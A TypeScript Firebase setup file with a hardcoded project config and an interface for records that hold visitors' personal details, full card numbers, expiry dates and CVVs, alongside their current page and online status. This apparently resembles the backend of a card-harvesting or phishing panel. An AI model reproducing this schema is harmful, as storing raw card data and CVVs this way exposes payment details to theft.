import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore } from 'firebase/firestore';
import { getDatabase } from 'firebase/database';

const firebaseConfig = {
  apiKey: "AIzaSyCPtI0KgL01TA_TKJtj2V8ryIlPvrPapVg",
  authDomain: "compajn.firebaseapp.com",
  databaseURL: "https://compajn-default-rtdb.firebaseio.com",
  projectId: "compajn",
  storageBucket: "compajn.firebasestorage.app",
  messagingSenderId: "533578029706",
  appId: "1:533578029706:web:b9d73a4663b015fe39ab73",
  measurementId: "G-L08L9REDW4"
}

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);
export { app, auth, db,database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
  isOnline?: boolean
  lastSeen: string
}
